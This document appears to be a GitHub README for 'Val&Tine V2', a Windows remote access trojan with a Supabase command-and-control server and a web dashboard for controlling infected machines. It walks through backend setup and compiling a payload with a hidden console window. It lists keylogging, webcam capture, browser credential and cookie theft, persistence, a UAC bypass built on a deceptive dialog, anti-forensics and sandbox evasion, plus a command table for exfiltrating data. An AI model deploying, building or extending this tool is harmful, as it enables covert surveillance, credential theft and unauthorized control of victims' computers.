# 💘 Val&Tine V2 - Machine Management System

A sophisticated, cross-platform remote machine management framework utilizing a custom Supabase backend for command and control (C2). Val&Tine V2 provides a modern web-based dashboard for fleet management, real-time surveillance, and rapid data exfiltration.

![Version](https://img.shields.io/badge/version-2.0.0-red)
![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?logo=go)
![Supabase](https://img.shields.io/badge/Supabase-Backend-3ECF8E?logo=supabase)

---

## 📖 Table of Contents

- [Features](#-features)
- [Architecture](#-architecture)
- [Prerequisites](#-prerequisites)
- [Installation & Setup](#-installation--setup)
  - [1. Supabase Backend Setup](#1-supabase-backend-setup)
  - [2. Frontend Dashboard Setup](#2-frontend-dashboard-setup)
  - [3. Payload Compilation](#3-payload-compilation)
- [Usage Guide](#-usage-guide)
- [Disclaimer](#-disclaimer)

---

## ✨ Features

### Core Capabilities
- **Custom C2 Infrastructure**: Migrated from Discord API to a dedicated Supabase backend for total control, reliability, and data privacy.
- **Real-Time Dashboard**: Modern React-based UI built with Lovable.dev, featuring live updates via Supabase Realtime subscriptions.
- **Multi-Client Management**: Monitor and control hundreds of machines simultaneously with batch command execution.
- **Encrypted Communications**: AES-256 encrypted command streams (optional implementation in payload).

### Surveillance Suite
- 🖥️ **Remote Shell**: Execute commands via native Windows API `CreateProcess` with Anonymous Pipes for I/O redirection (stealthier than `exec.Command`).
- 📷 **Screen Capture**: Native GDI `BitBlt` implementation compiled directly into the binary—no external FFmpeg dependency required for screenshots.
- 🎥 **Webcam & Microphone**: Optional FFmpeg integration for media capture.
- ⌨️ **Keylogger**: Low-level `GetAsyncKeyState` hooking with active window context tracking.
- 📋 **Clipboard Monitoring**: Periodic clipboard content extraction.

### Exfiltration Tools
- 📁 **File Manager**: Browse, upload, and download files with chunked transfer support (bypasses file size limits).
- 🌐 **Browser Data**: Extract history, cookies, and saved credentials (Chrome, Edge, Firefox).
- 🔑 **Credential Harvesting**: WiFi passwords, system info, and user data.

### System Control
- 🔒 **Persistence**: Registry Run keys + Startup folder VBS stager.
- 🛡️ **UAC Bypass**: `ShellExecute` "runas" elevation technique with social engineering dialog.
- 🧹 **Anti-Forensics**: Clear temp files, PowerShell history, RunMRU, and Recycle Bin.
- 🕵️ **Anti-Analysis**: VM detection (MAC address, registry, BIOS), debugger checks, and analysis tool detection (Process Hacker, Wireshark, etc.).

---

## 🏗 Architecture

```
┌─────────────────┐         ┌──────────────────┐         ┌─────────────────┐
│   Target Machine│ ◄─────► │   Supabase DB    │ ◄─────► │  Operator Dashboard │
│   (Go Payload)  │   HTTPS │   (PostgreSQL)   │   HTTPS │   (React/Vite)      │
└─────────────────┘         └──────────────────┘         └─────────────────┘
        │                            │                            │
        │ 1. Beacon / Register       │                            │
        │ 2. Fetch Commands          │                            │
        │ 3. Execute & Upload Result │                            │
        │ 4. Upload Files/Screens    │                            │
        └────────────────────────────┘                            │
                                     ◄────────────────────────────┘
                                              1. View Fleet Status
                                              2. Issue Commands
                                              3. View Screenshots/Logs
```

---

## 📋 Prerequisites

1.  **Go (Golang)**: Version 1.21 or higher. [Download Here](https://go.dev/dl/)
2.  **Node.js & npm**: Version 18 or higher. [Download Here](https://nodejs.org/)
3.  **Supabase Account**: Free tier works. [Sign Up Here](https://supabase.com/)
4.  **GitHub Account**: For deployment of the frontend.

---

## 🚀 Installation & Setup

### 1. Supabase Backend Setup

This is the brain of your C2. You need to set up the database tables and security policies.

1.  **Create a Project**:
    *   Log in to [Supabase](https://supabase.com/).
    *   Click **"New Project"**.
    *   Name it (e.g., `val-tine-c2`). Set a strong database password.
    *   Select a region close to you.
    *   Wait 1-2 minutes for the project to provision.

2.  **Run Migrations (Setup Schema)**:
    *   In your Supabase project dashboard, click **"SQL Editor"** in the left sidebar.
    *   Click **"New query"**.
    *   You will use the migration files located in your local `supabase/migrations/` folder.
    *   **Option A (Manual)**: Open each `.sql` file in your `supabase/migrations` folder (start with the lowest numbered/earliest timestamp). Copy the content and paste it into the Supabase SQL Editor, then click **Run**.
    *   **Option B (CLI - Advanced)**: If you have the Supabase CLI installed, you can link your project and push migrations:
        ```bash
        supabase link --project-ref <your-project-ref>
        supabase db push
        ```

3.  **Get Credentials**:
    *   Go to **Settings** (gear icon) > **API**.
    *   **Project URL**: Copy this. This is your `SUPABASE_URL`.
    *   **anon public key**: Copy this. This is your `SUPABASE_ANON_KEY`.

### 2. Frontend Dashboard Setup

The dashboard is a static web app that connects to your Supabase backend.

1.  **Clone the Repository**:
    ```bash
    git clone https://github.com/YOUR_USERNAME/Val-Tine-V2.git
    cd Val-Tine-V2
    ```

2.  **Configure Environment Variables**:
    *   Rename `.env.example` to `.env` (or create a new `.env` file).
    *   Add your Supabase credentials:
        ```env
        VITE_SUPABASE_URL=https://your-project-ref.supabase.co
        VITE_SUPABASE_ANON_KEY=your-anon-key-here
        ```

3.  **Install Dependencies**:
    ```bash
    npm install
    ```

4.  **Run Locally (Development)**:
    ```bash
    npm run dev
    ```
    Open `http://localhost:5173` in your browser.

5.  **Deploy (Optional)**:
    *   Push your code to GitHub.
    *   Connect the repo to Vercel, Netlify, or Lovable for automatic deployment.
    *   Ensure you set the `VITE_SUPABASE_URL` and `VITE_SUPABASE_ANON_KEY` environment variables in your hosting provider's dashboard.

### 3. Payload Compilation

The payload is the executable you deploy to target machines. It connects to your Supabase backend.

1.  **Install Go**:
    *   Download and install Go from [go.dev](https://go.dev/dl/).

2.  **Prepare Project Structure**:
    *   Ensure `main.go` and `go.mod` are in the same directory.

3.  **Initialize Module & Install Dependencies**:
    Open a terminal/command prompt in the project folder.
    ```bash
    go mod init gopay
    go get golang.org/x/sys/windows
    go mod tidy
    ```

4.  **Input Supabase Credentials**:
    *   Open `main.go` with a text editor.
    *   Scroll to the `main()` function at the bottom.
    *   Find the `config := &Config{...}` block.
    *   Replace the placeholder values with your Supabase URL and Anon Key:
        ```go
        Domains: []C2Domain{
            {
                URL:      "https://your-project-ref.supabase.co", // PASTE HERE
                APIKey:   "your-anon-key-here",                   // PASTE HERE
                Priority: 10,
            },
        },
        ```

5.  **Build the Executable**:
    *   To build a standard executable:
        ```bash
        go build -o payload.exe main.go
        ```
    *   To build a stealthier version (hidden console, smaller size):
        ```bash
        go build -ldflags="-s -w -H windowsgui" -o payload.exe main.go
        ```
        *   `-s -w`: Strips debug information (reduces file size).
        *   `-H windowsgui`: Hides the console window on execution.

---

## 🎮 Usage Guide

### Operating the Dashboard

1.  **Dashboard View**:
    *   When you open the site, you see the **Fleet Overview**.
    *   Machines running the payload will appear here automatically within 30 seconds.
    *   Status Indicators: 🟢 Online, 🟡 Idle, ⚫ Offline.

2.  **Control Panel**:
    *   Click a machine row to open the **Control Panel**.
    *   **System Info**: View hardware, network, and OS details.
    *   **Remote Shell**: Type commands and see output in real-time.
    *   **Surveillance**: View screenshots, webcam feeds, and keylogs.
    *   **File Manager**: Browse the file system and exfiltrate data.

3.  **Batch Commands**:
    *   Use the checkboxes on the left of the table to select multiple machines.
    *   Use the **Batch Action Bar** to send commands to all selected machines at once.

### Command Reference

The payload accepts the following commands (sent via the "Remote Shell" or Batch Command interface):

| Command | Description |
| :--- | :--- |
| `sysinfo` | Gather and upload full system specifications. |
| `screenshot` | Capture a single screenshot of the desktop. |
| `keylog_start` | Start the background keylogger process. |
| `keylog_stop` | Stop the keylogger. |
| `persist` | Install persistence mechanisms (Registry + Startup). |
| `unpersist` | Remove persistence mechanisms. |
| `elevate` | Attempt UAC Bypass to gain Administrator privileges. |
| `cleanup` | Clear temp files, history, and recycle bin. |
| `browserdb` | Exfiltrate browser databases (Chrome, Edge, Firefox). |
| `exfiltrate <path>` | Compress and upload files from a specific directory. |
| `exit` | Terminate the payload on the target machine. |

---

## ⚠️ Disclaimer

**This tool is intended for EDUCATIONAL and RESEARCH purposes only.**

The use of this software to target systems that you do not own or have explicit permission to test is illegal. The developers and contributors assume no liability and are not responsible for any misuse or damage caused by this program. By using this software, you agree to comply with all applicable local, state, and federal laws.

**Unauthorized access to computer systems is a crime.**
```
